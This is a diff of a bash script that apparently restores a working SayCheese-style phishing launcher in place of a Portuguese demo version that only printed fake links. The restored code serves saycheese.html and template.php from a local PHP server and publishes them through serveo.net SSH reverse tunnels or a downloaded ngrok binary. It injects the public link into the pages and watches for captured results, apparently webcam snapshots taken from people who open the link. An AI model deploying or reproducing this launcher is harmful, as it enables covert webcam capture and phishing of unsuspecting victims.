@@ -159,143 +159,161 @@ while true; do
     rm -rf Log.log
   fi
   sleep 0.5
+
 done
+
 }
+
 
 server() {
-command -v ssh > /dev/null 2>&1 || {
-log "${ERR} SSH não está instalado. Abortando."
-exit 1
-}
 
-log "${INFO} Iniciando Serveo..."
-pkill -f php > /dev/null 2>&1
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-if [[ $subdomain_resp == true ]]; then
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
--R $subdomain:80:localhost:3333 serveo.net \
-2> /dev/null > sendlink &
-else
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
--R 80:localhost:3333 serveo.net \
-2> /dev/null > sendlink &
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
 fi
 
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
 sleep 8
-log "${INFO} Iniciando servidor PHP (localhost:3333)..."
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
-
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-log "${OK} Link direto: ${GREEN}$send_link${RESET}"
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+
 }
 
-payload() {
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-sed "s+forwarding_link+$send_link+g" maldoso.html > index2.html
-sed "s+forwarding_link+$send_link+g" template.php > index.php
-}
 
 payload_ngrok() {
+
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed "s+forwarding_link+$link+g" maldoso.html > index2.html
-sed "s+forwarding_link+$link+g" template.php > index.php
+sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+
+
 }
 
 ngrok_server() {
-command -v unzip > /dev/null 2>&1 || exit 1
-command -v wget > /dev/null 2>&1 || exit 1
 
-if [[ ! -e ngrok ]]; then
-log "${INFO} Baixando ngrok..."
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
 fi
 
-info "Iniciando servidor local"
-spinner
-wait_msg "Aguardando conexões"
-sleep 1.2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-info "Iniciando servidor online"
-spinner
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-log "${OK} Link direto: ${GREEN}$link${RESET}"
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
 }
 
 start1() {
-  rm -f sendlink
-  separator
-  printf "${GREEN}[01]${RESET} ${GRAY}Servidor Local (demo)${RESET}\n"
-  printf "${GREEN}[02]${RESET} ${GRAY}Servidor Online (demo)${RESET}\n"
-  printf "${GREEN}[00]${RESET} ${GRAY}Sair${RESET}\n"
-  separator
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
 
-  read -p "$(printf "${PURPLE}➜ Escolha uma opção: ${RESET}")" option_server
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server -eq 1 ]]; then
 
-  case "$option_server" in
-    1|"01")
-      start
-      ;;
-    2|"02")
-      ngrok_server
-      ;;
-    0|"00")
-      warn "Encerrando framework"
-      sleep 0.6
-      clear
-      exit 0
-      ;;
-    *)
-      warn "Opção inválida"
-      sleep 1
-      clear
-      start1
-      ;;
-  esac
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
+
+elif [[ $option_server -eq 2 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
+
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+
+
 }
 
 start() {
-default_subdomain="maldoso$RANDOM"
-read -p "$(echo -e ${GRAY}'[+] Escolher subdomínio? [Y/n]: '${RESET})" choose_sub
-choose_sub="${choose_sub:-Y}"
 
-if [[ $choose_sub =~ ^[Yy]$ ]]; then
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-read -p "$(echo -e ${GRAY}'[+] Subdomínio (default: '${default_subdomain}'):'${RESET})" subdomain
-subdomain="${subdomain:-$default_subdomain}"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
 fi
 
-info "Iniciando servidor online"
-spinner
-server_msg "Link gerado: ${GREEN}https://demo.server.net${RESET}"
-wait_msg "Monitorando acessos remotos"
-sleep 1.2
-capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
-sleep 1
-menu
 server
 payload
 checkfound
+
 }
 
-# ================== EXECUÇÃO ==================
-intro
-glitch_text "MALDOSO FRAMEWORK"
-glitch_text "Inicializando ambiente"
-spinner
 banner
-menu
 dependencies
 start1
+
